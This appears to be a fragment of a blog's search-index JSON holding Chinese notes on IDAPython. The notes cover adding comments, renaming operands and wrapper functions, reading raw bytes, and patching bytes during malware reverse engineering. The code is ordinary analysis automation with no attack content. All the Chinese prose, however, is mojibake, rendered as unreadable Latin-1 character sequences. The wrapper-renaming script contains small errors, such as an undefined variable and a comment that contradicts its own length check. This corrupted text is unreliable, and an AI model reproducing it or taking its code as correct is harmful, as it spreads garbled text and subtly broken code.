æˆ–è€…æ•°æ®çš„åœ°å€ï¼Œä½ ç°åœ¨æƒ³é€‰å–å®ƒä»¬åˆ†æä¸€ä¸‹ã€‚å¯èƒ½æˆ‘ä»¬åªæ˜¯æƒ³è¦æŠŠçªå‡ºæŸäº›ä»£ç ç„¶ååœ¨è¿™äº›ä»£ç ä¸Šé¢åˆ©ç”¨ IDAPython è¿›è¡Œå·¥ä½œã€‚ä¸ºäº†è·å¾—é€‰å®šæ•°æ®çš„è¾¹ç•Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ idc.read_selection_start()æ¥è·å–å¼€å§‹åœ°å€å’Œ idc.read_selection_end()æ¥è·å¾—ç»“æŸåœ°å€ï¼Œä¸ä¸¾ä¾‹äº†ã€‚ æ³¨æ„åœ¨åˆ†æ 64 ä½å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™å®¹æ˜“å‡ºé”™ï¼Œå› ä¸º 64 ä½åœ°å€å®¹æ˜“å¯¼è‡´æ•´æ•° integer çš„æº¢å‡ºã€‚ ","date":"2021-03-01","objectID":"/idapython/:1:9","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"æ³¨é‡Šå’Œé‡å‘½å æˆ‘ä»¬ä½¿ç”¨ idc.set_cmt(ea, comment, 0)æ¥å¢åŠ æ³¨é‡Šï¼Œidc.set_cmt(ea, comment, 1)æ¥å¢åŠ é‡å¤æ€§æ³¨é‡Šï¼Œea æ˜¯è¦æ·»åŠ æ³¨é‡Šçš„åœ°å€ã€‚ä¸‹é¢ä»£ç åœ¨ä¸€æ¡æŒ‡ä»¤(ç”¨ XOR æ¸…é›¶å¯„å­˜å™¨)å‡ºç°çš„æ—¶å€™è‡ªåŠ¨å¢åŠ æ³¨é‡Šã€‚ for func in idautils.Functions(): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 FUNC_LIB or flags \u0026 FUNC_THUNK: continue dism_addr = list(idautils.FuncItems(func)) for ea in dism_addr: if idc.print_insn_mnem(ea) == \"xor\": if idc.print_operand(ea, 0) == idc.print_operand(ea, 1): print(hex(ea), idc.GetDisasm(ea)) comment = \"%s = 0\" % (idc.print_operand(ea,0)) idc.set_cmt(ea, comment, 0) å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨ idautils.Functions()æ¥å¾ªç¯éå†æ‰€æœ‰å‡½æ•°ï¼Œå¹¶é€šè¿‡è°ƒç”¨ list(idautils. FuncItems(func))éå†æ‰€æœ‰æŒ‡ä»¤ã€‚ç„¶ååˆ©ç”¨ idc.print_insn_mnem(ea)è·å–æ“ä½œç¬¦ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦ä¸º XORã€‚ç„¶ååˆ©ç”¨ idc.print_operand(ea, n)åˆ¤æ–­ä¸¤ä¸ªæ“ä½œæ•°æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œé‚£ä¹ˆç»™å®ƒåŠ ä¸Šå¸¸è§„æ³¨é‡Šã€‚ .text:000000D90 xor ebp, ebp ; ebp = 0 å¦‚æœè¦å¢åŠ é‡å¤æ€§æ³¨é‡Šï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ idc.set_cmt(ea, comment, 1) ã€‚ è¿™æ ·åšå¥½åƒæ›´æœ‰ç”¨ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›åˆ†æ”¯åšäº†æ¸…é›¶ï¼Œå°±åƒæ˜¯è¿”å› 0 çš„æ“ä½œã€‚è¦è·å–ä¸€ä¸ªæ³¨é‡Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ida_bytes.get_cmt(ea, repeatable)è¯¥å‡½æ•°ï¼Œea æ˜¯åœ°å€ï¼Œrepeatable æ˜¯ bool å€¼ã€‚è¦è·å–ä¸Šè¿°çš„æ³¨é‡Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ä»£ç ï¼š ida_bytes.get_cmt(ea, False) å¦‚æœè¦è·å–é‡å¤æ€§æ³¨é‡Šä½¿ç”¨ ida_bytes.get_cmt(ea, True)å°±å¯ä»¥äº†ã€‚å½“ç„¶ä¸åªæ˜¯æŒ‡ä»¤å¯ä»¥åšæ³¨é‡Šï¼Œå‡½æ•°ä¹Ÿå¯ä»¥åšæ³¨é‡Šçš„è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨ idc.set_func_cmt(ea, cmt, repeatable)æ³¨é‡Šå‡½æ•°å’Œåˆ©ç”¨ idc.get_func_cmt(ea, repeatable)è·å–å‡½æ•°çš„æ³¨é‡Šã€‚ea å¯ä»¥æ˜¯å‡½æ•°ä¸­çš„ä»»ä½•åœ°å€ï¼Œcmt æ˜¯æˆ‘ä»¬è¦æ·»åŠ çš„æ³¨é‡Šï¼Œrepeatable åŒä¸Šé¢ä¸€æ ·ã€‚å°†å‡½æ•°çš„æ³¨é‡Šæ ‡è®°ä¸ºå¯é‡å¤æ€§çš„è¯ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨ä»»ä½•è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹å¢åŠ æ³¨é‡Šã€‚ Python\u003eidc.get_func_name(ea) done Python\u003eidc.set_func_cmt(ea, \"done\", 1) True ç¬¬ä¸€è¡Œæˆ‘ä»¬æ‰“å°å‡½æ•°çš„åå­—ï¼Œç„¶åæˆ‘ä»¬åˆ©ç”¨idc.set_func_cmt(ea, comment, repeatable)æ¥è®¾ç½®ä¸€ä¸ªå¯é‡å¤æ€§æ³¨é‡Šï¼ˆcheck out laterï¼‰ç»™è¯¥å‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬å»è§‚å¯Ÿå‡½æ•°çš„èµ·å§‹åœ°å€å°±å¯ä»¥å‘ç°æˆ‘ä»¬å¢åŠ çš„æ³¨é‡Šã€‚å› ä¸ºå‡½æ•°çš„æ³¨é‡Šæ˜¯å¯é‡å¤æ€§çš„ï¼Œæ‰€ä»¥å‡½æ•°çš„äº¤å‰å¼•ç”¨åœ°æ–¹æˆ‘ä»¬åŒæ ·èƒ½çœ‹åˆ°æ³¨é‡Šã€‚è¿™æ ·çš„è¯å°±èƒ½å¤Ÿå¾ˆå¥½çš„æç¤ºæˆ‘ä»¬å‡½æ•°çš„åŠŸèƒ½ã€‚ é‡å‘½åå‡½æ•°å’Œåœ°å€æ˜¯ä¸€é¡¹éå¸¸å¸¸è§çš„è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸€äº›äºåœ°å€æ— å…³ä»£ç ï¼ˆPICï¼‰ï¼ŒåŠ å£³æˆ–è€…å°è£…å‡½æ•°ä¸­ï¼Œå› ä¸ºåœ¨ PIC ä»£ç å’Œè„±å£³ä»£ç ä¸­ï¼Œå¯¼å…¥è¡¨å¯èƒ½å¹¶ä¸å­˜åœ¨äºè½¬å‚¨ä¸­ã€‚è€Œå°è£…å‡½æ•°çš„åŠŸèƒ½åªæ˜¯ç®€å•çš„è°ƒç”¨ API è€Œå·²ã€‚ idc.set_name(ea, \"func_name\", SN_CHECK) è¦é‡å‘½åä¸€ä¸ªæ“ä½œæ•°ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°å®ƒçš„åœ°å€å…ˆï¼Œæ¯”å¦‚åœ¨ 004047B0 æœ‰ä¸€ä¸ªåŒå­—æˆ‘ä»¬æƒ³è¦é‡å‘½åï¼š .text:004047AD lea ecx, [ecx+0] .text:004047B0 mov eax, dword_41400C .text:004047B6 mov ecx, [edi+4BCh] è¦è·å–æ“ä½œæ•°çš„æ•°å€¼æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ get_operand_value(ea, n) Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0x4047b0 mov eax, dword_41400C Python\u003eop = idc.get_operand_value(ea,1) Python\u003eprint(hex(op), idc.GetDisasm(op)) 0x41400c dd 2 Python\u003eidc.set_name(op, \"BETA\", SN_CHECK) True Python\u003eprint(hex(ea), idc.GetDisasm(ea)) 0x4047b0 mov eax, BETA[esi] ç¬¬ä¸€è¡Œæˆ‘ä»¬æ‰“å°äº†å½“å‰åœ°å€ä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬æŠŠç¬¬äºŒä¸ªæ“ä½œæ•°dword_41400Cèµ‹å€¼ç»™opï¼Œç„¶åä½¿ç”¨ idc.set_name(op, \"name, SN_CHECK)è¿›è¡Œé‡å‘½åï¼Œæœ€åæ‰“å°å‡ºæ–°çš„è¢«é‡å‘½åçš„åå­—ã€‚ å¥½äº†ï¼Œæ—¢ç„¶æˆ‘ä»¬ç°åœ¨åŸºç¡€å·²ç»å¾ˆå¥½äº†ï¼Œæˆ‘ä»¬ç°åœ¨å°±ç”¨æˆ‘ä»¬æ‰€å­¦çš„æ¥è‡ªåŠ¨åŒ–å‘½åå°è£…å‡½æ•°ã€‚è¯·æ³¨æ„æ³¨é‡Šçš„æ„æ€æ¥ä¿è¯ä½ èƒ½å¤Ÿç†è§£ä»£ç é€»è¾‘ã€‚ import idautils def rename_wrapper(name, func_addr): if idc.set_name(func_addr, name, SN_NOWARN): print(\"Function at 0x%x renamed %s\" %( func_addr,idc.get_func_name(func))) else: print(\"Rename at 0x%x failed. Function %s is being used.\"% (func_addr, name)) return def check_for_wrapper(func): flags = idc.get_func_attr(func, FUNCATTR_FLAGS) # skip library \u0026 thunk functions if flags \u0026 FUNC_LIB or flags \u0026 FUNC_THUNK: return dism_addr = list(idautils.FuncItems(func)) # get length of the function func_length = len(dism_addr) # if over 32 lines of instruction return if func_length \u003e 64: print(\"over 64 lines of instruction return, func_len is 0x%x.\" % func_length) return func_call = 0 instr_cmp = 0 op = None op_addr = None op_type = None # for each instruction in the function for ea in dism_addr: m = idc.print_insn_mnem(ea) if m == 'call' or m == 'jmp': if m == 'jmp': temp = idc.get_operand_value(ea,0) # ignore jump conditions within the function boundaries if temp in dism_addr: print(\"jump conditions within the function boundaries\") continue func_call += 1 # wrappers should not contain multiple function calls if func_call == 2: print(\"wrappers contain multiple function calls\") return op_addr = idc.get_operand_value(ea , 0) op_type = idc.get_operand_type(ea,0) elif m == 'cmp' or m == 'test': # wrappers functions should not contain much logic. instr_cmp += 1 if instr_cmp == 3: print(\"wrappers functions contain so much logic\") return else: continue # all instructions in the function have been analyzed if op_addr == None: return name = idc.get_name(op_addr, ida_name.GN_VISIBLE) # skip mangled function names if \"[\" in name or \"$\" in name or \"?\" in name or \"@\" in name or name == \"\": print(\"m","date":"2021-03-01","objectID":"/idapython/:1:10","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"è®¿é—®åŸå§‹æ•°æ® åœ¨é€†å‘å·¥ç¨‹ä¸­è·å–åŸå§‹æ•°æ®æ˜¯éå¸¸é‡è¦çš„ã€‚åŸå§‹æ•°æ®æ˜¯ 16 è¿›åˆ¶çš„å­—èŠ‚ï¼Œå®ƒä»¬è¢«è§£é‡Šä¸ºæ•°æ®æˆ–è€…ä»£ç ï¼Œida ä¸­æˆ‘ä»¬å¯ä»¥åœ¨åæ±‡ç¼–ä»£ç çª—å£çš„å·¦ä¾§çœ‹åˆ°è¿™äº›åŸå§‹æ•°æ®ã€‚ è¦è·å–åŸå§‹æ•°æ®çš„è¯æˆ‘ä»¬é¦–å…ˆè¦æŒ‡å®šè·å–çš„å•å…ƒå¤§å°ï¼Œè¿™äº›è·å–åŸå§‹æ•°æ® API çš„å‘½åè§„åˆ™å°±æ˜¯ä»¥å•å…ƒå¤§å°ã€‚æˆ‘ä»¬ä½¿ç”¨ idc.get_wide_byte(ea)è·å–å•å­—èŠ‚ï¼Œidc.get_wide_word(ea)è·å–å­—ç­‰ç­‰ã€‚ ","date":"2021-03-01","objectID":"/idapython/:1:11","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"},{"categories":["reverse"],"content":"è¡¥ä¸ æœ‰æ—¶å€™æˆ‘ä»¬åœ¨é€†å‘ä¸€ä¸ªæ¶æ„è½¯ä»¶çš„æ—¶å€™ï¼Œæ ·æœ¬ä¼šæœ‰è¢«åŠ å¯†çš„å­—ç¬¦ä¸²ã€‚è¿™ä¼šé˜»ç¢æˆ‘ä»¬åˆ†æçš„è¿‡ç¨‹å’Œç»„ç»‡æˆ‘ä»¬é€šè¿‡å­—ç¬¦ä¸²æ¥å®šä½å…³é”®ç‚¹ã€‚è¿™ç§æƒ…å†µä¸‹ç»™ idb æ–‡ä»¶æ‰“è¡¥ä¸å°±å¾ˆæœ‰ç”¨äº†ã€‚é‡å‘½ååœ°å€ä½†æ˜¯å¥½åƒå¹¶æ²¡æœ‰åµç”¨ï¼Œå› ä¸ºå‘½åæ˜¯æœ‰çº¦æŸé™åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»™æŸäº›åœ°å€åšpatchäº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‡½æ•°æ¥ patchï¼š ida_bytes.patch_byte(ea, value) ida_bytes.patch_word(ea, value) ida_bytes.patch_dword(ea, value) ida_bytes.patch_qword(ea, value) é€†å‘çš„åŸºæ“ï¼Œæ‡’å¾—ä¸¾ä¾‹äº†ã€‚ å‰©ä¸‹ä¸‰ä¸ªè‡ªå·±çœ‹çœ‹å§ï¼Œå†™ä¸åŠ¨äº†ã€‚ ","date":"2021-03-01","objectID":"/idapython/:1:12","tags":["reverse"],"title":"idapythonç¬”è®°","uri":"/idapython/"}]